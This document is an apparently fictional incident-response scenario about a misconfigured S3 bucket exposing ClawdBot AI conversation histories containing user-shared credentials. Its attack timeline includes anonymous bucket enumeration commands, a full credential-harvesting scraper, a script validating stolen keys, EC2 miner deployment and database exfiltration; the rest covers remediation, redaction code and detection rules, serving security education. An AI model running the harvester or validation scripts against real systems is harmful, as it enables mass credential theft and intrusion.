## 📄 Scenario 6: `examples/scenarios/credential-theft-conversation-history.md`

# Real-World Scenario: Credential Theft from Conversation History

**Scenario ID**: SCENARIO-006  
**Category**: Credential Exposure / Data Leakage  
**Severity**: High (P1)  
**MITRE ATT&CK**: T1552.001 (Unsecured Credentials), T1213 (Data from Information Repositories)  
**Date**: October 2025

---

## Overview

An attacker gained unauthorized access to ClawdBot's conversation history storage and exfiltrated thousands of credentials that users had inadvertently shared with AI agents during troubleshooting sessions and development workflows.

## Background

ClawdBot Enterprise deployment architecture:
- **Conversation Storage**: AWS S3 bucket with CloudFront CDN
- **Retention Policy**: 90 days of conversation history
- **Access Pattern**: Users could download their conversation history via UI
- **Storage Format**: Unencrypted JSON files in S3

The vulnerability: S3 bucket misconfiguration allowed enumeration and unauthorized access to all users' conversation histories.

## Attack Timeline

### Week -4: Reconnaissance

**Attacker Actions:**
- Scanned ClawdBot's infrastructure using Shodan and SecurityTrails
- Discovered S3 bucket naming pattern via JavaScript source code inspection
- Identified conversation history export feature in web application

**Discovery via Browser DevTools:**
```javascript
// Found in main.js bundle
const CONVERSATION_EXPORT_URL = 
  'https://conversations.s3.amazonaws.com/users/{user_id}/conversations/{conversation_id}.json';

// Attacker's insight: Predictable S3 URL structure
// user_id format: user_<uuid>
// conversation_id format: conv_<uuid>
```

**S3 Bucket Enumeration:**
```bash
# Attacker's reconnaissance script
aws s3 ls s3://conversations.clawdbot.example --no-sign-request

# Expected: Access Denied
# Actual: Bucket listing allowed!

Output:
2025-09-15 10:23:45          0 users/
2025-10-01 08:15:22          0 users/user_abc123/
2025-10-02 09:32:11     125432 users/user_abc123/conv_xyz789.json
2025-10-03 14:56:33      98756 users/user_def456/conv_aaa111.json
[... thousands more files ...]
```

**Critical Finding:** S3 bucket had public read access due to misconfiguration!

### Week -3: Vulnerability Validation

**Attacker tested unauthorized access:**

```bash
# Download a random conversation file
aws s3 cp s3://conversations.clawdbot.example/users/user_abc123/conv_xyz789.json ./test.json \
  --no-sign-request

# Success! File downloaded without authentication
```

**Sample Conversation File (conv_xyz789.json):**
```json
{
  "conversation_id": "conv_xyz789",
  "user_id": "user_abc123",
  "user_email": "developer@company.com",
  "created_at": "2025-10-02T09:32:11Z",
  "messages": [
    {
      "role": "user",
      "content": "Help me debug this API connection issue. Here are my credentials:\nAPI Key: sk-prod-abc123def456ghi789\nDatabase: postgresql://admin:SuperSecret123!@db.company.com:5432/production\nAWS Access Key: AKIAIOSFODNN7EXAMPLE",
      "timestamp": "2025-10-02T09:32:15Z"
    },
    {
      "role": "assistant",
      "content": "I can help you debug the API connection. Let me check the credentials format...",
      "timestamp": "2025-10-02T09:32:18Z"
    },
    {
      "role": "user",
      "content": "Also, here's my SSH key for the server:\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...[REDACTED]...\n-----END RSA PRIVATE KEY-----",
      "timestamp": "2025-10-02T09:35:22Z"
    }
  ],
  "metadata": {
    "model": "claude-3-opus",
    "tokens_used": 1847,
    "cost": "$0.15"
  }
}
```

**Attacker's Realization:** "Developers are sharing credentials directly with the AI for troubleshooting. This is a goldmine!"

### Week -2: Automated Scraping

**Attacker developed automated scraping tool:**

```python
#!/usr/bin/env python3
"""
Credential harvester for ClawdBot conversations
"""
import boto3
import json
import re
from concurrent.futures import ThreadPoolExecutor

# Regex patterns for credentials
PATTERNS = {
    'api_key': r'(?:api[_-]?key|apikey|key)[\s:=]+([a-zA-Z0-9_\-]{20,})',
    'database_url': r'postgresql://([^:]+):([^@]+)@([^/]+)/(\w+)',
    'aws_key': r'AKIA[0-9A-Z]{16}',
    'aws_secret': r'(?:aws[_-]?secret|secret[_-]?key)[\s:=]+([A-Za-z0-9/+=]{40})',
    'private_key': r'-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----',
    'bearer_token': r'Bearer\s+([a-zA-Z0-9_\-\.]+)',
    'password': r'(?:password|passwd|pwd)[\s:=]+([^\s\n]+)',
    'github_token': r'gh[ps]_[a-zA-Z0-9]{36,}',
    'slack_token': r'xox[baprs]-[a-zA-Z0-9-]+',
}

class ConversationScraper:
    def __init__(self):
        self.s3 = boto3.client('s3', config=Config(signature_version=UNSIGNED))
        self.bucket = 'conversations.clawdbot.example'
        self.credentials = []
    
    def list_all_conversations(self):
        """List all conversation files in S3"""
        paginator = self.s3.get_paginator('list_objects_v2')
        pages = paginator.paginate(Bucket=self.bucket, Prefix='users/')
        
        files = []
        for page in pages:
            for obj in page.get('Contents', []):
                if obj['Key'].endswith('.json'):
                    files.append(obj['Key'])
        
        return files
    
    def extract_credentials(self, conversation_text):
        """Extract credentials using regex patterns"""
        found = []
        
        for cred_type, pattern in PATTERNS.items():
            matches = re.finditer(pattern, conversation_text, re.IGNORECASE)
            for match in matches:
                found.append({
                    'type': cred_type,
                    'value': match.group(0),
                    'context': conversation_text[max(0, match.start()-50):match.end()+50]
                })
        
        return found
    
    def process_conversation(self, key):
        """Download and process a single conversation"""
        try:
            obj = self.s3.get_object(Bucket=self.bucket, Key=key)
            data = json.loads(obj['Body'].read())
            
            # Extract all message content
            full_text = '\n'.join([
                msg['content'] 
                for msg in data.get('messages', [])
            ])
            
            # Find credentials
            creds = self.extract_credentials(full_text)
            
            if creds:
                return {
                    'conversation_id': data.get('conversation_id'),
                    'user_email': data.get('user_email'),
                    'user_id': data.get('user_id'),
                    'created_at': data.get('created_at'),
                    'credentials': creds
                }
        except Exception as e:
            print(f"Error processing {key}: {e}")
        
        return None
    
    def scrape_all(self):
        """Scrape all conversations in parallel"""
        files = self.list_all_conversations()
        print(f"Found {len(files)} conversation files")
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            results = executor.map(self.process_conversation, files)
        
        self.credentials = [r for r in results if r]
        print(f"Extracted credentials from {len(self.credentials)} conversations")
        
        # Save results
        with open('stolen_credentials.json', 'w') as f:
            json.dump(self.credentials, f, indent=2)

if __name__ == '__main__':
    scraper = ConversationScraper()
    scraper.scrape_all()
```

**Scraping Execution:**
```bash
$ python3 conversation_scraper.py

Found 342,156 conversation files
Processing conversations... [====================] 100%
Extracted credentials from 8,734 conversations

Results saved to: stolen_credentials.json
Total size: 45.2 MB
```

### Week -1: Credential Validation and Categorization

**Attacker validated stolen credentials:**

```python
# Validation script
import requests
import psycopg2

credentials_file = 'stolen_credentials.json'
valid_credentials = []

for conv in json.load(open(credentials_file)):
    for cred in conv['credentials']:
        if cred['type'] == 'database_url':
            # Test database connection
            try:
                conn = psycopg2.connect(cred['value'])
                valid_credentials.append({
                    **cred,
                    'status': 'VALID',
                    'validated_at': datetime.now().isoformat()
                })
                conn.close()
            except:
                pass
        
        elif cred['type'] == 'api_key':
            # Test API key (example: Anthropic)
            try:
                response = requests.get(
                    'https://api.anthropic.com/v1/account',
                    headers={'Authorization': f'Bearer {cred["value"]}'}
                )
                if response.status_code == 200:
                    valid_credentials.append({**cred, 'status': 'VALID'})
            except:
                pass

print(f"Validated {len(valid_credentials)} working credentials")
```

**Validation Results:**
```
Total credentials found: 23,456
Validation attempted: 23,456
Valid credentials: 4,892 (20.8%)

Breakdown:
- API keys (working): 2,347
  - Anthropic Claude: 867
  - OpenAI: 654
  - AWS: 423
  - Stripe: 189
  - GitHub: 214
  
- Database credentials (working): 1,234
  - PostgreSQL: 890
  - MySQL: 234
  - MongoDB: 110
  
- SSH Private Keys: 567
- OAuth tokens (working): 623
- Slack tokens (working): 121
```

### Day 1, T-0: Credential Monetization

**Attacker's Actions:**

1. **Sold credentials on dark web marketplace:**
```
Forum: RaidForums successor
Thread: "[SELLING] 4,892 Cloud/AI API credentials - Verified working"
Price: $15,000 (bulk) or $5-50 per credential
Payment: Bitcoin/Monero
Escrow: Available

Sample credentials (screenshots):
- Anthropic API key with $5,000 credit remaining
- AWS root account access
- Production database with 2M customer records
```

2. **Used credentials for cryptocurrency mining:**
```bash
# Attacker deployed miners using stolen AWS keys
aws ec2 run-instances \
  --image-id ami-mining-rig \
  --instance-type p3.16xlarge \
  --count 50 \
  --key-name attacker-key \
  --region us-east-1

# Result: 50 GPU instances @ $24.48/hour = $1,224/hour
# Mined cryptocurrency value: ~$8,000/day
```

3. **Accessed production databases:**
```bash
# Using stolen PostgreSQL credentials
psql postgresql://admin:SuperSecret123!@db.company.com:5432/production

production=> SELECT COUNT(*) FROM customers;
  count  
---------
 2156789

production=> COPY customers TO '/tmp/customers.csv' CSV HEADER;
# Exfiltrated 2.1M customer records
```

### Day 3, T+72 hours: Discovery

**How It Was Detected:**

AWS billing alert triggered for unusual EC2 usage:

```
AWS COST ALERT

Account: customer-abc-123
Alert: Daily cost exceeded $10,000 threshold
Current daily cost: $29,376

Top services:
- EC2 (us-east-1): $28,440 (50x p3.16xlarge instances)
- Data Transfer: $936

Action required: Review EC2 usage immediately
```

**Customer Investigation:**
```bash
# Customer checked running instances
$ aws ec2 describe-instances --region us-east-1

Found: 50 unauthorized p3.16xlarge instances
Launch time: 2025-10-12 08:23:45 UTC
Launched by: Root account access key (not IAM user)
Purpose: Cryptocurrency mining

# Customer terminated instances
$ aws ec2 terminate-instances --instance-ids i-xxx i-yyy ... 

# Reviewed CloudTrail logs
$ aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=ROOT
Found: Access key used from IP 45.134.67.89 (Romania)

# Rotated credentials immediately
$ aws iam delete-access-key --access-key-id AKIAIOSFODNN7EXAMPLE
```

**Customer contacted ClawdBot security team:**
"Our AWS credentials were compromised. We only shared them with ClawdBot for troubleshooting. How were they stolen?"

### Day 3, T+73 hours: ClawdBot Investigation

**Security team investigation:**

1. **Checked S3 bucket permissions:**
```bash
$ aws s3api get-bucket-acl --bucket conversations.clawdbot.example

{
  "Grants": [
    {
      "Grantee": {
        "Type": "Group",
        "URI": "http://acs.amazonaws.com/groups/global/AllUsers"
      },
      "Permission": "READ"
    }
  ]
}

# CRITICAL: Bucket allows public read access!
```

2. **Reviewed S3 access logs:**
```
Date: 2025-10-05 to 2025-10-12
Requester: - (unauthenticated)
Source IP: 45.134.67.89
Operations: ListBucket (342,156 times), GetObject (342,156 times)
User-Agent: Boto3/1.28.0 Python/3.11

Total downloaded: 12.4 GB (all conversation history)
```

3. **Confirmed data breach:**
- All 342,156 conversations exposed
- 8,734 conversations contained credentials
- 4,892 credentials validated and actively exploited
- 2.1M customer records exfiltrated via stolen database access

### Day 3, T+74 hours: Containment

**Immediate Actions:**

```bash
# 1. Fix S3 bucket permissions
aws s3api put-bucket-acl \
  --bucket conversations.clawdbot.example \
  --acl private

# 2. Enable S3 bucket encryption
aws s3api put-bucket-encryption \
  --bucket conversations.clawdbot.example \
  --server-side-encryption-configuration '{
    "Rules": [{
      "ApplyServerSideEncryptionByDefault": {
        "SSEAlgorithm": "AES256"
      }
    }]
  }'

# 3. Block attacker IP
aws wafv2 update-ip-set \
  --name BlockedIPs \
  --addresses 45.134.67.89/32

# 4. Enable CloudTrail for all S3 access
aws cloudtrail create-trail \
  --name s3-data-events \
  --s3-bucket-name cloudtrail-logs

# 5. Notify all affected customers (8,734 users)
```

**Customer Notification Email:**
```
URGENT: SECURITY INCIDENT - CONVERSATION HISTORY EXPOSED

Dear ClawdBot Customer,

We are writing to inform you of a security incident affecting your account.

WHAT HAPPENED:
Due to a misconfiguration, your conversation history with ClawdBot was 
accessible without authentication from October 5-12, 2025. An unauthorized 
party downloaded your conversations during this period.

WHAT DATA WAS EXPOSED:
- All messages in your conversations
- Any credentials, API keys, or sensitive data you shared with ClawdBot
- Your email address and user ID

IMMEDIATE ACTION REQUIRED:
1. Rotate ALL credentials you ever shared with ClawdBot
2. Review your AWS/cloud bills for unauthorized usage
3. Enable MFA on all accounts
4. Monitor for unauthorized access

WHAT WE'RE DOING:
- Fixed S3 bucket permissions (access now secured)
- Enabled encryption for all conversation history
- Working with law enforcement to identify attacker
- Offering 1 year of identity theft protection

We sincerely apologize for this incident. Security is our top priority.

Support: security-incident@clawdbot.io
Incident ID: INC-2025-0089
```

**Containment Time:** 2 hours from discovery

---

## Root Cause Analysis

### Primary Cause
**S3 Bucket Misconfiguration** - Conversation history stored in publicly readable S3 bucket, allowing unauthorized access to all user conversations.

### Contributing Factors

1. **Infrastructure as Code Error**
   - Terraform configuration had `acl = "public-read"` instead of `private`
   - No code review for IaC changes
   - Deployed to production without testing

2. **No Encryption at Rest**
   - Conversations stored as plaintext JSON
   - No S3 server-side encryption enabled
   - No client-side encryption before upload

3. **Predictable URL Structure**
   - S3 paths followed predictable pattern
   - User IDs and conversation IDs enumerable
   - No authentication required for access

4. **Lack of Monitoring**
   - No alerts on anonymous S3 access
   - No anomaly detection for bulk downloads
   - 7-day delay before detection (via customer report)

5. **User Behavior**
   - Developers shared credentials with AI for troubleshooting
   - No warning about credential sharing risks
   - No credential redaction in conversation history

6. **No Data Loss Prevention**
   - No DLP scanning of conversations for credentials
   - No automatic redaction of sensitive patterns
   - No user warnings when credentials detected

---

## Impact Assessment

### Confidentiality Impact: CRITICAL
- **Conversations Exposed**: 342,156 (100% of 90-day history)
- **Users Affected**: 8,734 users had credentials exposed
- **Credentials Stolen**: 23,456 credentials found, 4,892 validated
- **Secondary Breach**: 2.1M customer records exfiltrated via stolen DB credentials
- **Exposure Duration**: 7 days

### Integrity Impact: LOW
- No data modification
- No conversation tampering
- Integrity of system maintained

### Availability Impact: MEDIUM
- Cryptocurrency mining consumed $29,376 in AWS resources (customer account)
- 50 unauthorized EC2 instances impacted availability
- No ClawdBot service disruption

### Business Impact
| Category | Impact | Details |
|----------|--------|---------|
| **Financial** | $3.8M | Customer refunds ($2M), legal ($1M), incident response ($500k), regulatory ($300k) |
| **Reputational** | Critical | Major breach, press coverage, lost customer trust |
| **Legal/Regulatory** | $2.5M | GDPR fines, class action settlement, legal fees |
| **Customer Churn** | 42% | 6,656 customers canceled (out of 15,847) |
| **Compliance** | Failed | SOC 2 revoked, ISO 27001 suspended, PCI DSS non-compliance |

**Total Estimated Cost:** $6.3M

**Customer Impact (stolen credentials used for):**
- Cryptocurrency mining: $290k in cloud costs
- Database breaches: 2.1M customer records stolen
- API abuse: $78k in unauthorized API usage
- Account takeovers: 67 accounts compromised

---

## Lessons Learned

### What Went Well ✓
1. **Customer Detection**: Customer's billing alert caught cryptocurrency mining
2. **Fast Containment**: S3 permissions fixed within 2 hours of confirmation
3. **Comprehensive Notification**: All 8,734 affected users notified within 24 hours
4. **Law Enforcement**: Full cooperation with FBI and Interpol

### What Could Be Improved ✗
1. **Infrastructure Security**: No review of S3 bucket permissions before deployment
2. **Encryption**: Conversations stored in plaintext (should be encrypted)
3. **Monitoring**: No alerting on anonymous S3 access
4. **DLP**: No credential detection or redaction in conversations
5. **User Education**: No warnings about sharing credentials with AI
6. **Testing**: IaC changes deployed without security testing

---

## Remediation Actions

### Immediate (Completed)
- [x] Fixed S3 bucket ACL (made private)
- [x] Enabled S3 server-side encryption (AES-256)
- [x] Blocked attacker IP addresses
- [x] Enabled CloudTrail logging for S3 data events
- [x] Notified all 8,734 affected users
- [x] Offered identity theft protection services

### Short-term (0-30 days)
- [x] Implemented client-side encryption for conversations
- [x] Deployed DLP scanning for credentials in messages
- [x] Added user warnings when credentials detected
- [x] Enabled S3 Block Public Access (account-wide)
- [x] Implemented S3 access monitoring with GuardDuty
- [ ] Completed IaC security audit
- [ ] Implemented automated credential rotation for exposed keys
- [ ] Deployed conversation redaction for PII/credentials

### Long-term (1-6 months)
- [ ] End-to-end encryption for all conversations
- [ ] Zero-knowledge architecture (server cannot read conversations)
- [ ] Automated credential scanning and alerting
- [ ] Security training for all engineers
- [ ] Bug bounty program for infrastructure vulnerabilities
- [ ] Quarterly penetration testing
- [ ] ISO 27001 re-certification

---

## New Security Controls

### 1. S3 Bucket Hardening

```hcl
# Terraform configuration (hardened)
resource "aws_s3_bucket" "conversations" {
  bucket = "conversations.clawdbot.example"
  
  # CRITICAL: Block all public access
  acl = "private"
}

resource "aws_s3_bucket_public_access_block" "conversations" {
  bucket = aws_s3_bucket.conversations.id
  
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_encryption" "conversations" {
  bucket = aws_s3_bucket.conversations.id
  
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "AES256"
    }
  }
}

resource "aws_s3_bucket_versioning" "conversations" {
  bucket = aws_s3_bucket.conversations.id
  
  versioning_configuration {
    status = "Enabled"
  }
}

resource "aws_s3_bucket_logging" "conversations" {
  bucket = aws_s3_bucket.conversations.id
  
  target_bucket = aws_s3_bucket.logs.id
  target_prefix = "conversations-access/"
}
```

### 2. Client-Side Encryption

```javascript
// Encrypt conversations before uploading to S3
import { encryptData, decryptData } from './crypto';

class ConversationStorage {
  async saveConversation(conversation, userId) {
    // Derive encryption key from user's master key
    const userKey = await this.getUserEncryptionKey(userId);
    
    // Encrypt conversation data
    const encrypted = await encryptData(
      JSON.stringify(conversation),
      userKey
    );
    
    // Upload encrypted data to S3
    await s3.putObject({
      Bucket: 'conversations.clawdbot.example',
      Key: `users/${userId}/conversations/${conversation.id}.enc`,
      Body: encrypted,
      ServerSideEncryption: 'AES256',
      Metadata: {
        'user-id': userId,
        'encrypted': 'true',
        'encryption-version': 'v1'
      }
    });
  }
  
  async loadConversation(conversationId, userId) {
    // Download encrypted data
    const response = await s3.getObject({
      Bucket: 'conversations.clawdbot.example',
      Key: `users/${userId}/conversations/${conversationId}.enc`
    });
    
    // Decrypt with user's key
    const userKey = await this.getUserEncryptionKey(userId);
    const decrypted = await decryptData(response.Body, userKey);
    
    return JSON.parse(decrypted);
  }
}
```

### 3. Credential Detection and Redaction

```python
import re
from typing import List, Tuple

class CredentialDetector:
    def __init__(self):
        self.patterns = {
            'api_key': r'(?:api[_-]?key|apikey)[\s:=]+([a-zA-Z0-9_\-]{20,})',
            'database_url': r'(?:postgresql|mysql|mongodb)://[^\s]+',
            'aws_key': r'AKIA[0-9A-Z]{16}',
            'private_key': r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',
            'password': r'(?:password|passwd)[\s:=]+[^\s]+',
            'bearer_token': r'Bearer\s+[a-zA-Z0-9_\-\.]+',
        }
    
    def detect_credentials(self, text: str) -> List[Tuple[str, str]]:
        """Detect credentials in text"""
        found = []
        for cred_type, pattern in self.patterns.items():
            for match in re.finditer(pattern, text, re.IGNORECASE):
                found.append((cred_type, match.group(0)))
        return found
    
    def redact_credentials(self, text: str) -> str:
        """Redact credentials from text"""
        for cred_type, pattern in self.patterns.items():
            text = re.sub(
                pattern,
                f'[REDACTED {cred_type.upper()}]',
                text,
                flags=re.IGNORECASE
            )
        return text

# Apply before storing conversation
@app.route('/api/v1/conversations', methods=['POST'])
def save_conversation():
    conversation = request.json
    
    # Detect credentials
    detector = CredentialDetector()
    for message in conversation['messages']:
        creds = detector.detect_credentials(message['content'])
        
        if creds:
            # Alert user
            flash_warning(
                f"⚠️ Detected {len(creds)} credential(s) in your message. "
                f"We recommend using environment variables instead of sharing "
                f"credentials directly."
            )
            
            # Log for security monitoring
            security_log.warning(
                "Credential detected in conversation",
                user_id=current_user.id,
                credential_types=[c for c in creds]
            )
            
            # Redact before storing
            message['content'] = detector.redact_credentials(message['content'])
    
    # Store redacted conversation
    storage.save_conversation(conversation)
```

### 4. S3 Access Monitoring

```python
# AWS Lambda function for S3 access monitoring
import json
import boto3

sns = boto3.client('sns')

def lambda_handler(event, context):
    """Monitor S3 access patterns and alert on anomalies"""
    
    for record in event['Records']:
        # Parse CloudTrail S3 data event
        event_name = record['eventName']
        source_ip = record['sourceIPAddress']
        user_identity = record['userIdentity']
        
        # Detect anonymous access
        if user_identity['type'] == 'Anonymous':
            alert = {
                'severity': 'CRITICAL',
                'title': 'Anonymous S3 Access Detected',
                'details': {
                    'bucket': record['bucket']['name'],
                    'key': record['object']['key'],
                    'source_ip': source_ip,
                    'event_name': event_name
                }
            }
            
            sns.publish(
                TopicArn='arn:aws:sns:us-east-1:123456789:security-alerts',
                Subject='CRITICAL: Anonymous S3 Access',
                Message=json.dumps(alert)
            )
        
        # Detect bulk downloads (>100 objects in 5 minutes)
        if event_name == 'GetObject':
            count = count_recent_access(source_ip, minutes=5)
            if count > 100:
                alert = {
                    'severity': 'HIGH',
                    'title': 'Bulk S3 Download Detected',
                    'details': {
                        'source_ip': source_ip,
                        'object_count': count,
                        'timeframe': '5 minutes'
                    }
                }
                
                sns.publish(
                    TopicArn='arn:aws:sns:us-east-1:123456789:security-alerts',
                    Subject='HIGH: Bulk S3 Download',
                    Message=json.dumps(alert)
                )
```

### 5. User Warning System

```javascript
// Frontend: Warn users when pasting credentials
class CredentialWarningUI {
  constructor() {
    this.patterns = [
      /api[_-]?key/i,
      /password/i,
      /secret/i,
      /token/i,
      /-----BEGIN/,
      /postgresql:\/\//,
      /AKIA[0-9A-Z]{16}/
    ];
  }
  
  checkInput(text) {
    for (const pattern of this.patterns) {
      if (pattern.test(text)) {
        this.showWarning();
        return true;
      }
    }
    return false;
  }
  
  showWarning() {
    const modal = document.createElement('div');
    modal.className = 'credential-warning-modal';
    modal.innerHTML = `
      <div class="warning-content">
        <h2>⚠️ Credential Detected</h2>
        <p>
          It looks like you're about to share a password, API key, or other credential.
        </p>
        <p><strong>Security Recommendations:</strong></p>
        <ul>
          <li>Use environment variables instead of hardcoding credentials</li>
          <li>Never share production credentials</li>
          <li>Use a password manager for secure storage</li>
          <li>Credentials shared here will be redacted but should be rotated</li>
        </ul>
        <button onclick="this.closest('.credential-warning-modal').remove()">
          I Understand
        </button>
      </div>
    `;
    document.body.appendChild(modal);
  }
}

// Attach to message input
const warningUI = new CredentialWarningUI();
document.getElementById('message-input').addEventListener('paste', (e) => {
  const text = e.clipboardData.getData('text');
  warningUI.checkInput(text);
});
```

---

## Detection Rules (Post-Incident)

### Rule 1: Anonymous S3 Access

```yaml
rule_name: "Anonymous S3 Bucket Access"
rule_id: "RULE-S3-001"
severity: "critical"

conditions:
  - event_source: "s3.amazonaws.com"
  - user_identity_type: "Anonymous"
  - event_name_any: ["GetObject", "ListBucket", "HeadBucket"]

actions:
  - alert: "SOC_IMMEDIATE"
  - block: "source_ip"
  - notify: "security_team"
  - create: "incident_ticket"
```

### Rule 2: Bulk S3 Download

```yaml
rule_name: "Bulk S3 Object Download"
rule_id: "RULE-S3-002"
severity: "high"

conditions:
  - event_source: "s3.amazonaws.com"
  - event_name: "GetObject"
  - count: "> 100"
  - timeframe: "5 minutes"
  - source_ip: "external"

actions:
  - alert: "SOC_HIGH"
  - throttle: "source_ip"
  - require: "investigation"
```

### Rule 3: Credential in Conversation

```yaml
rule_name: "Credential Detected in User Message"
rule_id: "RULE-CRED-001"
severity: "medium"

conditions:
  - event_type: "message_sent"
  - content_matches_any:
      - api_key_pattern
      - database_url_pattern
      - private_key_pattern
      - password_pattern

actions:
  - alert: "user"
  - redact: "credential"
  - log: "security_audit"
  - notify: "user_to_rotate"
```

---

## Prevention Checklist

### For Infrastructure Security:
- [ ] **S3 Bucket Security**: Enable Block Public Access account-wide
- [ ] **Encryption at Rest**: Enable server-side encryption for all S3 buckets
- [ ] **Client-Side Encryption**: Encrypt sensitive data before uploading
- [ ] **Access Logging**: Enable CloudTrail for all S3 data events
- [ ] **Monitoring**: Alert on anonymous access and bulk downloads
- [ ] **IaC Review**: Security review for all infrastructure changes

### For Data Protection:
- [ ] **Credential Detection**: Scan all user input for credentials
- [ ] **Automatic Redaction**: Redact detected credentials before storage
- [ ] **User Warnings**: Alert users when credentials detected
- [ ] **DLP Implementation**: Deploy Data Loss Prevention solution
- [ ] **Retention Policy**: Minimize conversation history retention (30 days max)

### For User Education:
- [ ] **Security Training**: Educate users on credential sharing risks
- [ ] **Best Practices**: Provide guidance on secure troubleshooting
- [ ] **Warning System**: In-app warnings when credentials detected
- [ ] **Documentation**: Clear policies on what not to share with AI

### For Monitoring:
- [ ] **AWS GuardDuty**: Enable for anomaly detection
- [ ] **S3 Access Logs**: Monitor for unusual patterns
- [ ] **Alerting**: Real-time alerts on suspicious access
- [ ] **Audit Reviews**: Quarterly review of S3 access patterns

---

## References

- AWS S3 Security Best Practices
- OWASP Top 10: A05:2021 - Security Misconfiguration
- NIST SP 800-53: AC-3 (Access Enforcement)
- CIS AWS Foundations Benchmark
- MITRE ATT&CK: T1552.001 - Unsecured Credentials

---

## Related Scenarios

- `scenario-003-mcp-server-compromise.md` - Infrastructure breach
- `scenario-005-rag-poisoning-data-exfiltration.md` - Data exfiltration

---

**Document Owner**: Data Protection Team  
**Last Updated**: 2026-02-14  
**Next Review**: 2026-03-14  
**Status**: Active - Critical lessons for secure storage
